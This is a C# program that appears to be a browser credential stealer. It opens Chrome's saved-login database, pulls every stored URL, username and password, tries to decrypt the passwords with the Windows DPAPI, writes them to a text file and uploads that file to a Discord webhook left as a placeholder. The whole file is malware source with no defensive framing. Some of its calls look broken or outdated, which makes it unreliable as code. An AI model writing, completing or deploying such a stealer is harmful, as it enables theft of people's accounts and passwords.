using System;
using System.IO;
using System.Data.SQLite;
using System.Runtime.InteropServices;
using System.Net;

class Program
{
    [DllImport("crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct DATA_BLOB
    {
        public int cbData;
        public IntPtr pbData;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CRYPTPROTECT_PROMPTSTRUCT
    {
        public int cbSize;
        public int dwPromptFlags;
        public IntPtr hwndApp;
        public string szPrompt;
    }

    static void Main(string[] args)
    {
        string dataPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\");
        string loginDb = Path.Combine(dataPath, "Login Data");

        // open file to write information
        using (StreamWriter file = new StreamWriter("chrome-information.txt"))
        {
            // connecting to the database
            using (SQLiteConnection connection = new SQLiteConnection($"Data Source={loginDb};Version=3;New=False;Compress=True;"))
            {
                connection.Open();
                using (SQLiteCommand command = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", connection))
                using (SQLiteDataReader reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        string url = reader.GetString(0);
                        string username = reader.GetString(1);
                        DATA_BLOB encryptedPassword = new DATA_BLOB
                        {
                            cbData = reader.GetInt32(2),
                            pbData = reader.GetIntPtr(2)
                        };
                        DATA_BLOB optionalEntropy = new DATA_BLOB();
                        CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT();
                        DATA_BLOB decryptedPassword = new DATA_BLOB();
                        CryptUnprotectData(ref encryptedPassword, null, ref optionalEntropy, IntPtr.Zero, ref prompt, 0, ref decryptedPassword);
                        string password = Marshal.PtrToStringUni(decryptedPassword.pbData);
                        Marshal.ZeroFreeGlobalAllocUnicode(decryptedPassword.pbData);
                        file.WriteLine($"URL: {url}\nUsername: {username}\nPassword: {password}\n");
                    }
                }
                connection.Close();
            }
        }

        // send file to Discord webhook
        using (FileStream fileStream = File.OpenRead("chrome-information.txt"))
        {
            WebClient client = new WebClient();
            client.UploadFile("YOUR WEBHOOK URL", fileStream.Name);
        }
    }
}
